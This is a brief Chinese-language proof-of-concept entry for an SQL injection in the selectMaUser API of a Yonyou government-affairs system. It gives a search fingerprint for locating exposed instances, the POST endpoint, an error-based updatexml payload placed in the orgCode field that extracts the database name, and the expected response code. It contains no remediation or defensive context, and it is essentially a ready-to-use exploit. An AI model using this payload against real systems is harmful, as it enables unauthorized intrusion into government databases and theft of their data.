# 用友政务系统selectMaUser存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="eyeclose.png"`
- **请求**：`POST /ma/api/selectMaUser HTTP/1.1`

**Payload**
```
{"orgCode":"1' AND (updatexml(1,concat(0x7e,(select database()),0x7e),1)) AND '1'='1"}
```
- **响应特征**：200